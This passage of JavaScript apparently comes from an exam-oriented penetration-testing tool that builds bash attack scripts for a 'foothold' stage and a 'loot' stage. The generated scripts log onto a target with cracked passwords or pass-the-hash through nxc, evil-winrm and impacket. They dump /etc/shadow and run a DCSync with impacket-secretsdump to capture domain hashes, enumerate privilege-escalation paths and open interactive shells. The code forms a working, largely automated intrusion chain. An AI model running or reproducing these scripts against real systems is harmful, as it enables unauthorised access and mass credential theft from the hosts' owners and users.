        '  xclip -selection clipboard < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'elif command -v xsel >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
        '  xsel --clipboard --input < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'elif command -v wl-copy >/dev/null 2>&1; then',
        '  wl-copy < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'fi',
        'echo ""',
        'echo "================================================================================"',
        'echo "[obol] Stage 2 complete!${CLIP_NOTE}"',
        'echo "[obol] Log file saved at: $FULL_LOG"',
        'echo "[obol] Next: In OBOL Cruise, click \'Attach Log File\' and select:"',
        'echo "       $FULL_LOG"',
        'echo "================================================================================"',
      ].join('\n') + '\n';
    }

    if (stageId === 'foothold') {
      return [
        '#!/usr/bin/env bash',
        '# obol cruise - Stage 3: Kali-to-Target Foothold Triage, local.txt & Interactive Shell ' + modeTag,
        '# Generated ' + stamp + ' UTC. Runs on Kali: logs onto $TARGET with your foothold credentials,',
        '# captures local.txt/user.txt + whoami + ipconfig/ip a proof block + privesc enumeration,',
        '# saves scans/obol-stage3-*.log, and offers an interactive shell on the target.',
        'set -o pipefail',
        '',
        'TARGET="${1:-' + targetVal + '}"',
        'DOMAIN="' + domainVal + '"',
        'USER="' + userVal + '"',
        'PASS="' + passVal + '"',
        'NTHASH="' + hashVal + '"',
        'LHOST="' + lhostVal + '"',
        selfHealPreambleBash(),
        'LOG="scans/obol-stage3-$(date +%Y%m%d-%H%M%S).log"',
        'exec > >(tee -a "$LOG") 2>&1',
        '',
        'echo "[obol] Stage 3: Foothold Triage & local.txt Capture | Target: $TARGET | User: ${USER:-auto}"',
        'if [ -z "$PASS" ] && [ -z "$NTHASH" ] && [ -s "loot/john.pot" ]; then',
        '  POT_LINE=$(grep -iE \'^\\$krb5(asrep|tgs)\\$\' loot/john.pot 2>/dev/null | tail -n 1)',
        '  if [ -n "$POT_LINE" ]; then',
        '    PASS="${POT_LINE##*:}"',
        '    [ -z "$USER" ] && USER=$(grep -hiE \'^\\$krb5(asrep|tgs)\\$\' loot/asrep*.txt loot/kerberoast*.txt loot/*hash* 2>/dev/null | head -n 1 | sed -E \'s/^\\$krb5(asrep|tgs)\\$([0-9]+\\$)?\\*?([^@:$*]+).*/\\3/\')',
        '  fi',
        'fi',
        'USER="${USER%%@*}"',
        '',
        (osFam === 'windows' ? [
          'WIN_CMD=\'echo ===== OBOL STEP 1: flag-hunt-windows whoami ipconfig \'"$TARGET"\' ===== & whoami & hostname & ipconfig & (for /r C:\\Users %F in (local.txt user.txt) do @if exist "%F" (echo ===FLAG:%F:: & type "%F" & echo.)) & echo ===== OBOL STEP 2: windows-enum systeminfo whoami /all \'"$TARGET"\' ===== & ver & systeminfo & whoami /all & cmdkey /list & net user & net localgroup Administrators & echo ===== OBOL STEP 3: local-windows-interfaces ipconfig /all route print arp -a \'"$TARGET"\' ===== & ipconfig /all & route print & arp -a & netstat -ano\'',
          'WIN_PS=\'Write-Output "===== OBOL STEP 1: flag-hunt-windows whoami ipconfig \'"$TARGET"\' ====="; whoami; hostname; ipconfig; Get-ChildItem C:\\Users -Include local.txt,user.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object { "===FLAG:" + $_.FullName + "::" + (Get-Content $_.FullName -Raw).Trim() }; Write-Output "===== OBOL STEP 2: windows-enum systeminfo whoami /all \'"$TARGET"\' ====="; systeminfo; whoami /all; cmdkey /list; Write-Output "===== OBOL STEP 3: local-windows-interfaces ipconfig /all route print arp -a \'"$TARGET"\' ====="; route print; arp -a\'',
          'if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$NTHASH" ]; } && command -v nxc >/dev/null 2>&1; then',
          '  if [ -n "$NTHASH" ]; then',
          '    OUT3=$(nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -x "$WIN_CMD" 2>&1 || true)',
          '    echo "$OUT3"',
          '    if ! echo "$OUT3" | grep -q "===FLAG:"; then',
          '      nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -X "$WIN_PS" 2>&1 || nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -x "$WIN_CMD" 2>&1 || true',
          '    fi',
          '  else',
          '    OUT3=$(nxc winrm "$TARGET" -u "$USER" -p "$PASS" -x "$WIN_CMD" 2>&1 || true)',
          '    echo "$OUT3"',
          '    if ! echo "$OUT3" | grep -q "===FLAG:"; then',
          '      nxc winrm "$TARGET" -u "$USER" -p "$PASS" -X "$WIN_PS" 2>&1 || nxc smb "$TARGET" -u "$USER" -p "$PASS" -x "$WIN_CMD" 2>&1 || true',
          '    fi',
          '  fi',
          'else',
          '  echo "[obol] No remote WinRM/SMB credentials set; paste the Target One-Liner into your existing shell:"',
          '  echo \'whoami & hostname & ipconfig & (for /r C:\\Users %F in (local.txt user.txt) do @if exist "%F" (echo ===FLAG:%F:: & type "%F" & echo.)) & ver & systeminfo & whoami /all & route print & arp -a\'',
          'fi',
        ].join('\n') : [
          'LIN_CMD=\'echo "===== OBOL STEP 1: flag-hunt-linux id whoami ip a \'"$TARGET"\' ====="; whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; for f in $(find /home /root /var /srv /opt -maxdepth 3 \\( -name "local.txt" -o -name "user.txt" \\) 2>/dev/null); do v=$(tr -d "\\r\\n" < "$f"); [ -n "$v" ] && echo "===FLAG:${f}::${v}" && echo "$v"; done; echo "===== OBOL STEP 2: linux-enum uname sudo -l \'"$TARGET"\' ====="; uname -a; cat /etc/os-release 2>/dev/null; sudo -V 2>/dev/null | head -n 3; pkexec --version 2>/dev/null; sudo -n -l 2>&1 || true; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab 2>/dev/null; echo "===== OBOL STEP 3: local-linux-interfaces ip a ip route ip neigh ss -tulpn \'"$TARGET"\' ====="; ip a 2>/dev/null; ip route 2>/dev/null; ip neigh 2>/dev/null; ss -tulpn 2>/dev/null\'',
          'if [ -n "$USER" ] && [ -n "$PASS" ] && command -v sshpass >/dev/null 2>&1; then',
          '  timeout 30 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$USER@$TARGET" "$LIN_CMD" 2>&1 || true',
          'else',
          '  echo "[obol] Paste the Target One-Liner inside your existing Linux foothold shell:"',
          '  echo "$LIN_CMD"',
          'fi',
        ].join('\n')),
        '',
        'FULL_LOG="$(pwd)/$LOG"',
        'CLIP_NOTE=""',
        'if command -v xclip >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
        '  xclip -selection clipboard < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'elif command -v xsel >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
        '  xsel --clipboard --input < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'elif command -v wl-copy >/dev/null 2>&1; then',
        '  wl-copy < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
        'fi',
        'echo ""',
        'echo "================================================================================"',
        'echo "[obol] Stage 3 complete!${CLIP_NOTE}"',
        'echo "[obol] Log file saved at: $FULL_LOG"',
        'echo "[obol] Next: In OBOL Cruise, click \'Attach Log File\' and select:"',
        'echo "       $FULL_LOG"',
        'echo "================================================================================"',
      ].join('\n') + '\n';
    }

    // Stage 4: loot (Post-Root Proof, Pillage & Interactive OSCP Host Shell)
    return [
      '#!/usr/bin/env bash',
      '# obol cruise - Stage 4: Kali-to-Target OSCP Proof, Secret Pillage & Interactive Host Shell ' + modeTag,
      '# Generated ' + stamp + ' UTC. Runs on Kali: logs onto $TARGET as Administrator/root,',
      '# captures proof.txt/root.txt + local.txt/user.txt + whoami + ipconfig/ip a proof block,',
      '# saves scans/obol-stage4-*.log, and launches an interactive shell on the host for OSCP screenshots.',
      'set -o pipefail',
      '',
      'TARGET="${1:-' + targetVal + '}"',
      'DOMAIN="' + domainVal + '"',
      'USER="' + (userVal || (osFam === 'windows' ? 'Administrator' : 'root')) + '"',
      'PASS="' + passVal + '"',
      'NTHASH="' + hashVal + '"',
      'LHOST="' + lhostVal + '"',
      selfHealPreambleBash(),
      'LOG="scans/obol-stage4-$(date +%Y%m%d-%H%M%S).log"',
      'exec > >(tee -a "$LOG") 2>&1',
      '',
      'if [ -z "$NTHASH" ] && [ -s "loot/ntds-$TARGET.txt" ]; then',
      '  NTHASH=$(strip_ansi < "loot/ntds-$TARGET.txt" 2>/dev/null | grep -iE \'^(.*\\\\)?Administrator:500:\' | cut -d: -f4 | head -n 1)',
      '  [ -n "$NTHASH" ] && USER="Administrator"',
      'fi',
      'echo "[obol] Stage 4: Post-Root OSCP Proof & Interactive Host Shell | Target: $TARGET | User: $USER"',
      '',
      (osFam === 'windows' ? [
        'WIN_PROOF=\'echo ===== OBOL STEP 1: flag-hunt-windows whoami ipconfig \'"$TARGET"\' ===== & whoami & hostname & ipconfig & (for /r C:\\Users %F in (proof.txt root.txt local.txt user.txt) do @if exist "%F" (echo ===FLAG:%F:: & type "%F" & echo.)) & echo ===== OBOL STEP 2: local-windows-interfaces ipconfig /all route print arp -a \'"$TARGET"\' ===== & ipconfig /all & route print & arp -a\'',
        'if command -v nxc >/dev/null 2>&1; then',
        '  if [ -n "$NTHASH" ]; then',
        '    nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -x "$WIN_PROOF" 2>&1 || nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -x "$WIN_PROOF" 2>&1 || true',
        '  elif [ -n "$PASS" ]; then',
        '    nxc winrm "$TARGET" -u "$USER" -p "$PASS" -x "$WIN_PROOF" 2>&1 || nxc smb "$TARGET" -u "$USER" -p "$PASS" -x "$WIN_PROOF" 2>&1 || true',
        '  fi',
        'fi',
        'if [ ! -s "loot/ntds-$TARGET.txt" ] && command -v impacket-secretsdump >/dev/null 2>&1; then',
        '  echo "===== OBOL STEP 3: dcsync impacket-secretsdump $TARGET ====="',
        '  if [ -n "$NTHASH" ]; then',
        '    impacket-secretsdump -hashes "aad3b435b51404eeaad3b435b51404ee:$NTHASH" "${DOMAIN:+$DOMAIN/}${USER}@${TARGET}" -just-dc 2>&1 | tee "loot/ntds-$TARGET.txt" || true',
        '  elif [ -n "$PASS" ]; then',
        '    impacket-secretsdump "${DOMAIN:+$DOMAIN/}${USER}:${PASS}@${TARGET}" -just-dc 2>&1 | tee "loot/ntds-$TARGET.txt" || true',
        '  fi',
        'fi',
      ].join('\n') : [
        'LIN_PROOF=\'echo "===== OBOL STEP 1: flag-hunt-linux id whoami ip a \'"$TARGET"\' ====="; whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; for f in $(find /root /home -maxdepth 3 \\( -name "proof.txt" -o -name "root.txt" -o -name "local.txt" -o -name "user.txt" \\) 2>/dev/null); do v=$(tr -d "\\r\\n" < "$f"); [ -n "$v" ] && echo "===FLAG:${f}::${v}" && echo "$v"; done; echo "===== OBOL STEP 2: post-root-pillage cat /etc/shadow \'"$TARGET"\' ====="; cat /etc/shadow 2>/dev/null | grep -vE ":\\*:|:\\!:"; echo "===== OBOL STEP 3: local-linux-interfaces ip a ip route ip neigh \'"$TARGET"\' ====="; ip a 2>/dev/null; ip route 2>/dev/null; ip neigh 2>/dev/null\'',
        'if [ -n "$PASS" ] && command -v sshpass >/dev/null 2>&1; then',
        '  timeout 25 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$USER@$TARGET" "$LIN_PROOF" 2>&1 || true',
        'fi',
      ].join('\n')),
      '',
      'FULL_LOG="$(pwd)/$LOG"',
      'CLIP_NOTE=""',
      'if command -v xclip >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
      '  xclip -selection clipboard < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
      'elif command -v xsel >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then',
      '  xsel --clipboard --input < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
      'elif command -v wl-copy >/dev/null 2>&1; then',
      '  wl-copy < "$FULL_LOG" 2>/dev/null && CLIP_NOTE=" (Auto-copied to clipboard - just press Ctrl+V in OBOL!)" || true',
      'fi',
      'echo ""',
      'echo "================================================================================"',
      'echo "[obol] Stage 4 Proof & Pillage log saved at: $FULL_LOG${CLIP_NOTE}"',
      (osFam === 'windows' ? [
        'echo "[obol] OSCP Exam Interactive Shell - once inside the shell, run:"',
        'echo "       whoami; hostname; ipconfig; type C:\\Users\\Administrator\\Desktop\\root.txt"',
        'echo "================================================================================"',
        'if [ -t 0 ]; then',
        '  exec </dev/tty >/dev/tty 2>&1',
        '  if [ -n "$NTHASH" ] && command -v evil-winrm >/dev/null 2>&1; then',
        '    echo "[obol] Launching interactive Evil-WinRM shell on $TARGET as $USER..."',
        '    evil-winrm -i "$TARGET" -u "$USER" -H "$NTHASH"',
        '  elif [ -n "$PASS" ] && command -v evil-winrm >/dev/null 2>&1; then',
        '    echo "[obol] Launching interactive Evil-WinRM shell on $TARGET as $USER..."',
        '    evil-winrm -i "$TARGET" -u "$USER" -p "$PASS"',
        '  elif [ -n "$NTHASH" ] && command -v impacket-wmiexec >/dev/null 2>&1; then',
        '    echo "[obol] Launching interactive impacket-wmiexec shell on $TARGET as $USER..."',
        '    impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:$NTHASH" "${DOMAIN:+$DOMAIN/}${USER}@${TARGET}"',
        '  fi',
        'fi',
      ].join('\n') : [
        'echo "[obol] OSCP Exam Interactive Shell - once inside the shell, run:"',
        'echo "       whoami; id; hostname; ip -4 a; cat /root/proof.txt /root/root.txt 2>/dev/null"',
        'echo "================================================================================"',
        'if [ -t 0 ] && [ -n "$PASS" ] && command -v sshpass >/dev/null 2>&1; then',
        '  exec </dev/tty >/dev/tty 2>&1',
        '  echo "[obol] Launching interactive SSH shell on $TARGET as $USER..."',
        '  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET"',
        'fi',
      ].join('\n')),
    ].join('\n') + '\n';
  }

  function buildHostShellAccess(stageId, ctx) {
    ctx = ctx || {};
    var facts = ctx.facts || null;
    var osFam = ctx.osFamily || detectTargetOs(facts);
    var p = ctx.params || {};
    if (!validTarget(ctx.target || p.target)) return null;
    var targetVal = markerSafe(String(ctx.target || p.target).trim());
    var dom = markerSafe(p.domain || '');
    var user = markerSafe(p.user || p.username || '');
    var pass = p.password || '';
    var nthash = markerSafe(p.nthash || '');

    var localFlag = null;
    var rootFlag = null;
    if (facts && typeof facts.values === 'function') {
      if (!dom) {
        var dv = facts.values('ad.domain_known');
        if (dv.length && dv[0]) dom = markerSafe(dv[0].domain || dv[0].name || '');
      }
      var pool = (facts.values('credential.available') || []).concat(facts.values('credential.plaintext') || []);
      if (!user && pool.length) {
        var best = pool[0];
        user = markerSafe(best.user || best.username || '');
        pass = best.password || '';
        nthash = markerSafe(best.nthash || best.hash || '');
      }
      var lf = (facts.values('objective.local_flag') || []).concat(facts.values('objective.flag') || []);
      if (lf.length && lf[0] && lf[0].flag) {
        localFlag = { label: 'local.txt (user.txt)', flag: lf[0].flag, path: lf[0].path || '' };
      }
      var rf = (facts.values('objective.root_flag') || []);
      if (rf.length && rf[0] && rf[0].flag) {
        rootFlag = { label: 'proof.txt (root.txt)', flag: rf[0].flag, path: rf[0].path || '' };
      }
    }

    var loginCmd = '';
    var altLoginCmd = '';
    var proofCmd = '';
    if (osFam === 'windows') {
      var u = user || 'Administrator';
      if (nthash) {
        loginCmd = 'evil-winrm -i ' + targetVal + ' -u \'' + u + '\' -H \'' + nthash + '\'';
        altLoginCmd = 'impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:' + nthash + ' \'' + (dom ? (dom + '/') : '') + u + '@' + targetVal + '\'';
      } else if (pass) {
        var safePass = String(pass).replace(/'/g, "'\\''");
        loginCmd = 'evil-winrm -i ' + targetVal + ' -u \'' + u + '\' -p \'' + safePass + '\'';
        altLoginCmd = 'impacket-wmiexec \'' + (dom ? (dom + '/') : '') + u + ':' + safePass + '@' + targetVal + '\'';
      } else {
        loginCmd = 'evil-winrm -i ' + targetVal + ' -u \'' + u + '\' -p \'<PASSWORD>\'';
      }
      var winTypeParts = [];
      if (rootFlag && rootFlag.path && /^[A-Za-z]:\\/.test(rootFlag.path)) {
        winTypeParts.push('echo === ' + rootFlag.path + ' === & type "' + rootFlag.path + '" & echo.');
      }
      if (localFlag && localFlag.path && /^[A-Za-z]:\\/.test(localFlag.path)) {
        winTypeParts.push('echo === ' + localFlag.path + ' === & type "' + localFlag.path + '" & echo.');
      }
      if (!winTypeParts.length) {
        winTypeParts.push('(for /r C:\\Users %F in (proof.txt root.txt local.txt user.txt) do @if exist "%F" (echo === %F === & type "%F" & echo.))');
      }
      proofCmd = 'cmd /c "whoami & hostname & ipconfig & ' + winTypeParts.join(' & ') + '"';
    } else {
      var lu = user || (stageId === 'loot' ? 'root' : 'user');
      if (pass) {
        var safeLinPass = String(pass).replace(/'/g, "'\\''");
        loginCmd = 'sshpass -p \'' + safeLinPass + '\' ssh -o StrictHostKeyChecking=no \'' + lu + '@' + targetVal + '\'';
      } else {
        loginCmd = 'ssh -o StrictHostKeyChecking=no \'' + lu + '@' + targetVal + '\'';
      }
      var linCatParts = [];
      if (rootFlag && rootFlag.path && rootFlag.path.charAt(0) === '/') {
        linCatParts.push('echo "=== ' + rootFlag.path + ' ==="; cat "' + rootFlag.path + '"; echo ""');
      }
      if (localFlag && localFlag.path && localFlag.path.charAt(0) === '/') {
        linCatParts.push('echo "=== ' + localFlag.path + ' ==="; cat "' + localFlag.path + '"; echo ""');
      }
      if (!linCatParts.length) {
        linCatParts.push('head -n 5 /root/proof.txt /root/root.txt /home/*/local.txt /home/*/user.txt 2>/dev/null');
      }
      proofCmd = 'whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; ' + linCatParts.join('; ');
    }

    return {
      osFamily: osFam,
      target: targetVal,
      user: user,
      hasCred: !!(nthash || pass),
      loginCmd: loginCmd,
      altLoginCmd: altLoginCmd,
      proofCmd: proofCmd,
      localFlag: localFlag,
      rootFlag: rootFlag,
    };
  }

  function buildStageOneLiner(stageId, ctx) {
    ctx = ctx || {};
    var facts = ctx.facts || null;
    var osFam = ctx.osFamily || detectTargetOs(facts);
    var targetRaw = ctx.target || (ctx.params && ctx.params.target) || '';
    if (!validTarget(targetRaw)) return '';
    var targetVal = markerSafe(String(targetRaw).trim());
    if (stageId === 'foothold') {
      if (osFam === 'windows') {
        return 'cmd /c "echo ===== OBOL STEP 1: flag-hunt-windows whoami ipconfig ' + targetVal + ' ===== & whoami & hostname & ipconfig & (for /r C:\\Users %F in (local.txt user.txt) do @if exist \\"%F\\" (echo ===FLAG:%F:: & type \\"%F\\" & echo.)) & echo ===== OBOL STEP 2: windows-enum systeminfo whoami /all ' + targetVal + ' ===== & ver & systeminfo & whoami /all & cmdkey /list & echo ===== OBOL STEP 3: local-windows-interfaces ipconfig /all route print arp -a ' + targetVal + ' ===== & route print & arp -a & netstat -ano"';
      }
      return 'echo "===== OBOL STEP 1: flag-hunt-linux id whoami ip a ' + targetVal + ' ====="; whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; for f in $(find /home /root /var /srv /opt -maxdepth 3 \\( -name "local.txt" -o -name "user.txt" \\) 2>/dev/null); do v=$(tr -d "\\r\\n" < "$f"); [ -n "$v" ] && echo "===FLAG:${f}::${v}" && echo "$v"; done; echo "===== OBOL STEP 2: linux-enum uname sudo -l ' + targetVal + ' ====="; uname -a; cat /etc/os-release 2>/dev/null; sudo -V 2>/dev/null | head -n 2; sudo -n -l 2>&1; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab 2>/dev/null; echo "===== OBOL STEP 3: local-linux-interfaces ip a ip route ip neigh ss -tulpn ' + targetVal + ' ====="; ip route 2>/dev/null; ip neigh 2>/dev/null; ss -tulpn 2>/dev/null';
    }
    if (stageId === 'loot') {
      if (osFam === 'windows') {
        return 'cmd /c "echo ===== OBOL STEP 1: flag-hunt-windows whoami ipconfig ' + targetVal + ' ===== & whoami & hostname & ipconfig & (for /r C:\\Users %F in (proof.txt root.txt local.txt user.txt) do @if exist \\"%F\\" (echo ===FLAG:%F:: & type \\"%F\\" & echo.)) & echo ===== OBOL STEP 2: local-windows-interfaces ipconfig /all route print arp -a ' + targetVal + ' ===== & route print & arp -a"';
      }
      return 'echo "===== OBOL STEP 1: flag-hunt-linux id whoami ip a ' + targetVal + ' ====="; whoami; id; hostname; ip -4 a 2>/dev/null || ifconfig; for f in $(find /root /home -maxdepth 3 \\( -name "proof.txt" -o -name "root.txt" -o -name "local.txt" -o -name "user.txt" \\) 2>/dev/null); do v=$(tr -d "\\r\\n" < "$f"); [ -n "$v" ] && echo "===FLAG:${f}::${v}" && echo "$v"; done; echo "===== OBOL STEP 2: post-root-pillage cat /etc/shadow ' + targetVal + ' ====="; cat /etc/shadow 2>/dev/null | grep -vE \':\\*:|:\\!:\'; echo "===== OBOL STEP 3: local-linux-interfaces ip a ip route ip neigh ' + targetVal + ' ====="; ip route 2>/dev/null; ip neigh 2>/dev/null';
    }
    return '';
  }

  // Summarize at-a-glance Run Stats, Paid-Off discoveries, Ruled-Out hypotheses, and the "Why Next" theory
  function summarizeHandoff(facts, pack, opts) {
    opts = opts || {};
    var mode = (opts.mode === 'lab') ? 'lab' : 'exam';
    pack = pack || (OBOL.packs && OBOL.packs.actions && OBOL.packs.actions()) || [];
    var stPlan = planStages(facts, pack, opts);
    var activities = opts.activities || [];
    var highlights = [];
    var ruledOut = [];
    var ports = [];
    var credCount = 0;
    var hashTypes = [];
    var privs = [];
    var subs = [];
    var domName = '';
    var osLabel = '';

    if (facts && typeof facts.values === 'function') {
      var portVals = facts.values('scan.ports.open').concat(facts.values('ports.open'));
      var portSet = {};
      portVals.forEach(function (v) { ((v && v.ports) || []).forEach(function (p) { portSet[p] = 1; }); });
      ports = Object.keys(portSet).map(Number).sort(function (a, b) { return a - b; });
      if (ports.length) {
        highlights.push({ kind: 'ports', label: 'Open Ports (' + ports.length + ')', value: ports.slice(0, 14).join(', ') + (ports.length > 14 ? ' ...' : '') });
        // Infer ruled-out service hypotheses from port scan
        if (!portSet[21]) ruledOut.push('FTP (:21 closed)');
        if (!portSet[139] && !portSet[445]) ruledOut.push('SMB (:445 closed)');
        if (!portSet[88] && !portSet[389] && !portSet[636]) ruledOut.push('AD / LDAP (:389 closed)');
        if (!portSet[111] && !portSet[2049]) ruledOut.push('NFS (:2049 closed)');
      }

      var osFam = stPlan.osFamily;
      var osVals = facts.values('host.os_family').concat(facts.values('host.os_hint'));
      var osDetail = '';
      for (var oi = 0; oi < osVals.length; oi++) {
        if (osVals[oi] && osVals[oi].os) { osDetail = osVals[oi].os; break; }
      }
      if (osFam !== 'auto' || osDetail) {
        osLabel = osDetail || (osFam === 'windows' ? 'Windows' : 'Linux');
        highlights.push({ kind: 'os', label: 'Target OS', value: osLabel });
      }

      var domVals = facts.values('ad.domain_known');
      if (domVals.length && domVals[0] && (domVals[0].domain || domVals[0].name)) {
        domName = domVals[0].domain || domVals[0].name;
        highlights.push({ kind: 'domain', label: 'AD Domain', value: domName });
      }

      var rawCreds = (facts.values('credential.available') || [])
        .concat(facts.values('credential.plaintext') || []);
      var seenUsers = {};
      var uniqueUsers = [];
      rawCreds.forEach(function (c) {
        var u = (c && (c.user || c.username)) ? String(c.user || c.username).trim() : '';
        if (!u) return;
        var k = u.toLowerCase();
        if (!seenUsers[k]) {
          seenUsers[k] = 1;
          uniqueUsers.push(u);
        }
      });
      credCount = uniqueUsers.length;
      if (uniqueUsers.length) {
        highlights.push({ kind: 'creds', label: 'Usable Creds (' + uniqueUsers.length + ')', value: uniqueUsers.slice(0, 6).join(', ') });
      }

      ['hash.asrep', 'hash.tgs', 'hash.ntlm', 'credential.netntlm', 'hash.candidate', 'hash.mscache'].forEach(function (hk) {
        if (facts.has(hk)) hashTypes.push(hk.replace(/^(hash|credential)\./, ''));
      });
      if (hashTypes.length) {
        highlights.push({ kind: 'hashes', label: 'Captured Hashes', value: hashTypes.join(', ') });
      }

      [
        ['privesc.sudo_rights', 'sudo rights'],
        ['privesc.sudo_binary', 'sudo GTFOBin'],
        ['vuln.baron_samedit', 'Baron Samedit sudo'],
        ['vuln.polkit', 'PwnKit pkexec'],
        ['vuln.dirtypipe', 'DirtyPipe kernel'],
        ['vuln.dirtycow', 'DirtyCow kernel'],
        ['privesc.kernel_exploit', 'Kernel exploit'],
        ['privesc.suid_candidate', 'SUID binary'],
        ['privesc.capability', 'Linux capability'],
        ['privesc.cron_writable', 'Writable cron'],
        ['privesc.windows_privilege', 'SeImpersonate / token priv'],
        ['privesc.unquoted_service_path', 'Unquoted service path'],
        ['privesc.weak_service_permission', 'Weak service ACL'],
        ['privesc.always_install_elevated', 'AlwaysInstallElevated'],
        ['privesc.stored_credentials', 'Stored credentials'],
        ['privesc.scheduled_task', 'Scheduled task'],
      ].forEach(function (pair) {
        if (facts.has(pair[0])) privs.push(pair[1]);
      });
      if (privs.length) {
        highlights.push({ kind: 'privesc', label: 'Privesc Vectors', value: privs.slice(0, 4).join(', ') });
      }

      var flags = [];
      if (facts.has('objective.local_flag') || facts.has('objective.flag')) flags.push('local.txt');
      if (facts.has('objective.root_flag')) flags.push('proof.txt');
      if (flags.length) {
        highlights.push({ kind: 'flags', label: 'Flags Captured', value: flags.join(' + ') });
      }

      var pivotVals = facts.values('pivot.candidate') || [];
      pivotVals.forEach(function (pv) {
        ((pv && pv.subnets) || []).forEach(function (s) { if (subs.indexOf(s) < 0) subs.push(s); });
      });
      if (subs.length) {
        highlights.push({ kind: 'pivot', label: 'Internal Subnets', value: subs.join(', ') });
      }
    }

    // Inspect activities for executed steps and ruled-out probes (0 facts added)
    var IGNORE_RULED_OUT = { paste: 1, cd: 1, echo: 1, export: 1, mkdir: 1, bash: 1, sh: 1, true: 1 };
    var stepsRun = activities.length;
    var paidSteps = 0;
    activities.forEach(function (a) {
      if (!a) return;
      if (a.addedCount > 0 || (a.produced && a.produced.length > 0)) {
        paidSteps++;
      } else {
        var label = a.action_id || a.tool || (a.command || '').split(/\s+/)[0] || '';
        if (label && !IGNORE_RULED_OUT[label.toLowerCase()] && ruledOut.indexOf(label + ' (no findings)') < 0 && ruledOut.length < 10) {
          ruledOut.push(label + ' (no findings)');
        }
      }
    });

    var stats = {
      stepsRun: stepsRun,
      paidSteps: paidSteps,
      openPorts: ports.length,
      credsAndHashes: credCount + hashTypes.length,
      localFlag: stPlan.flags.local,
      rootFlag: stPlan.flags.root,
      ruledOutCount: ruledOut.length,
    };

    // Build causal "Why Next" explanation ("Theory of the Case")
    var whyNext = '';
    var rec = null;
    var cps = stPlan.checkpoints;

    if (stPlan.activeStageId === 'recon') {
      whyNext = 'No port or service facts are on the ledger yet. Instead of running Nmap alone and forcing an extra round-trip, Stage 1 chains all-TCP + top-UDP Nmap with conditional safe checks across FTP, SSH, DNS, SMB, LDAP, HTTP, NFS, SNMP, and databases in one script.';
      rec = {
        kind: 'stage',
        stageId: 'recon',
        badge: 'NEXT: RUN STAGE 1 MULTI-HYPOTHESIS SCRIPT',
        title: 'Run Stage 1 (Multi-Hypothesis Recon & Triage) on Kali',
        detail: 'Download or copy Stage 1 below, run it against your target or CIDR subnet, and paste the log back.',
        whyNext: whyNext,
        primaryCheckpoint: null,
      };
    } else if (stPlan.activeStageId === 'enum') {
      var whyParts = [];
      if (ports.length) whyParts.push('ports ' + ports.slice(0, 6).join(', ') + ' are open');
      if (osLabel) whyParts.push('target is ' + osLabel);
      if (domName) whyParts.push('AD domain ' + domName + ' is active');
      if (credCount) whyParts.push(credCount + ' credential(s) are in hand');
      if (hashTypes.length) whyParts.push('offline hashes (' + hashTypes.join(', ') + ') are queued for cracking');

      whyNext = 'Because ' + (whyParts.length ? whyParts.join(', ') : 'Stage 1 ports are in')
        + (ruledOut.length ? (' and we already ruled out ' + ruledOut.slice(0, 3).join(', ')) : '')
        + ', Stage 2 shifts to ' + (stPlan.examPlan.batch.length ? (stPlan.examPlan.batch.length + ' unlocked frontier moves') : 'our Deep Fallback Wave')
        + ' + multi-service credential validation + share spidering + offline rockyou cracking'
        + (mode === 'lab' ? ' + automatic remote foothold & flag capture.' : '.');

      if (mode === 'exam' && cps.foothold.length) {
        rec = {
          kind: 'checkpoint',
          stageId: 'enum',
          badge: 'MANUAL FOOTHOLD READY (OR RUN STAGE 2)',
          title: 'Foothold Strike Unlocked: ' + cps.foothold[0].action.title,
          detail: 'You already have enough evidence to land a shell using the Manual Foothold Strike below (or switch to Lab Mode to automate foothold + flag capture in Stage 2).',
          whyNext: whyNext,
          primaryCheckpoint: cps.foothold[0],
        };
      } else {
        rec = {
          kind: 'stage',
          stageId: 'enum',
          badge: mode === 'lab' ? 'NEXT: RUN STAGE 2 LAB AUTOPILOT (.SH)' : 'NEXT: RUN STAGE 2 DEEP SWEEP (.SH)',
          title: mode === 'lab' ? 'Run Stage 2 (Deep Sweep, Auto-Crack & Auto-Foothold)' : 'Run Stage 2 (Deep Multi-Hypothesis Sweep)',
          detail: mode === 'lab'
